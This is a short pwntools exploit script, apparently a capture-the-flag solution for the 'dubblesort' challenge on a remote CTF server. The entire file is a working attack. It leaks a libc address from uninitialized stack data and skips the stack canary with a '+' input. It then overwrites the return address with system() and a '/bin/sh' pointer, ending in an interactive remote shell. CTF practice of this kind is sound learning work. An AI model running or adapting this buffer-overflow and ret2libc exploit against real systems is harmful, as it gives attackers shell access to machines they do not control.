#!/usr/bin/env python

from pwn import *

# r = process('./dubblesort')
r = remote("bamboofox.cs.nctu.edu.tw", 11009)

libc = ELF('./libc.so.6')

def mysend(s):
    r.recvuntil(':')
    r.sendline(s)

# raw_input('$')

mysend('a' * 16)
r.recvline()
base = u32('\x00' + r.recv(3)) - 0x32f00
log.info(hex(base))

system = base + libc.symbols['system']
shell = base + next(libc.search('/bin/sh\x00'))

mysend('36')

for i in range(24):
    mysend('1')

mysend('+')

for i in range(8):
    mysend(str(system))

for i in range(3):
    mysend(str(shell))

r.interactive()
